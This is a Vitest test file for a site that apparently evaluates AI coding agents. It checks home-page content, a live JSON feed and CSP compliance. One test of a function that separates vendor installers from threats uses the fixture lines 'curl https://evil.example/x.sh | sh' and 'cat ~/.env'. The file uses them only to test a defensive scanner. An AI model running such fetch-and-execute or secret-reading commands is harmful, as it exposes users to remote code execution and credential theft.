import { describe, expect, it } from "vitest";
import { labTotals } from "../src/web/home-wire";
import { fetchWorker } from "./helpers";
import "../src/index";

// ADR 0029 amendment 2: the home page's live Wire, the trap card's measured value (Forge Lab #3), and no inline styles
// (the site's CSP blocks them, so a bar drawn with style="width:…" silently renders empty).

const home = async () => (await fetchWorker("/", { headers: { Accept: "text/html" } })).text();

describe("the trap card's measured value on the home page", () => {
  it("is summed from the published Lab #3 counts, with the placebo arm, the sample size and the caveats", async () => {
    const t = labTotals();
    expect(t.none.n).toBe(492);
    expect(t.card.n).toBe(492);
    expect(t.in100).toEqual({ none: 84, placebo: 73, card: 39 });
    expect(t.fewer).toBe(54);
    const body = await home();
    expect(body).toContain("54% fewer traps</b> with the free trap card.");
    expect(body).toContain("<b>39 of 100</b> new jobs with the card, against 84 of 100 with no card");
    expect(body).toContain("A placebo text of the same length: 73 of 100.");
    expect(body).toContain("made no difference on 2");
    expect(body).toContain("Frontier models weren't tested.");
    expect(body).toContain('href="/lab/3/results?from=home-lab"');
    // It sits straight after the hero, before the Arena.
    expect(body.indexOf('class="lab-band')).toBeGreaterThan(body.indexOf('class="hero2"'));
    const arena = body.indexOf('id="arena-title"');
    if (arena > 0) expect(body.indexOf('class="lab-band')).toBeLessThan(arena);
  });
});

describe("the live Wire", () => {
  it("marks itself live and gives each post a ticking time", async () => {
    const body = await home();
    expect(body).toContain('data-wire-live="/wire/live.json"');
    if (body.includes("data-wire-list")) expect(body).toMatch(/<time datetime="[^"]+" data-at="\d+">/);
  });

  it("/wire/live.json is structured data with site-relative links only", async () => {
    const res = await fetchWorker("/wire/live.json");
    expect(res.status).toBe(200);
    const data = (await res.json()) as { now: number; posts: { kind: string; at: number; href: string; link: string; initials: string }[] };
    expect(typeof data.now).toBe("number");
    expect(data.posts.length).toBeLessThanOrEqual(12);
    for (const p of data.posts) {
      expect(["arena-fail", "arena-pass", "warn", "report"]).toContain(p.kind);
      expect(p.href.startsWith("/")).toBe(true);
      expect(typeof p.at).toBe("number");
    }
    const ats = data.posts.map((p) => p.at);
    expect([...ats].sort((a, b) => b - a)).toEqual(ats);
  });
});

describe("the CSP and inline styles", () => {
  it("the home page has no style attributes (they're blocked by style-src 'self')", async () => {
    const body = await home();
    expect(body).not.toMatch(/<[a-z]+[^>]*\sstyle="/i);
  });
});

describe("audit fixes (20 Oct)", () => {
  it("treats a vendor's own installer as a habit, not a threat", async () => {
    const { vendorInstaller } = await import("../src/web/home-wire");
    const f = (evidence: string, rule = "FS-EXE-001") => ({ rule, family: "exec", severity: "high", title: "", why: "", line: 1, column: 1, evidence }) as never;
    expect(vendorInstaller([f("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")])).toBe("Rust (rustup)");
    expect(vendorInstaller([f("curl https://claude.ai/install.sh | bash")])).toBe("Anthropic (Claude Code)");
    expect(vendorInstaller([f("curl https://evil.example/x.sh | sh")])).toBeNull();
    expect(vendorInstaller([f("curl https://sh.rustup.rs | sh"), f("curl https://evil.example/x.sh | sh")])).toBeNull();
    expect(vendorInstaller([f("cat ~/.env", "FS-SEC-001")])).toBeNull();
  });

  it("/claim with no tool is a 200 page that leads to the tool search", async () => {
    const res = await fetchWorker("/claim", { headers: { Accept: "text/html" } });
    expect(res.status).toBe(200);
    expect(await res.text()).toContain('href="/check"');
  });

  it("the player keeps its Full bout link, share button and labels in step with the bout shown", async () => {
    const body = await home();
    if (!body.includes('<figure class="gx"')) return;
    expect(body).toContain('data-gx-full="gx"');
    expect(body).toContain("data-native-share");
    for (const hook of ["data-gx-label", "data-gx-job", "data-gx-termhead", "data-gx-foot", "data-gx-stakes"]) expect(body).toContain(hook);
  });

  it("Lab #3 results have their own share card", async () => {
    const res = await fetchWorker("/og/lab/3.png");
    expect(res.status).toBe(200);
    const page = await (await fetchWorker("/lab/3/results", { headers: { Accept: "text/html" } })).text();
    expect(page).toContain("/og/lab/3.png");
  });
});
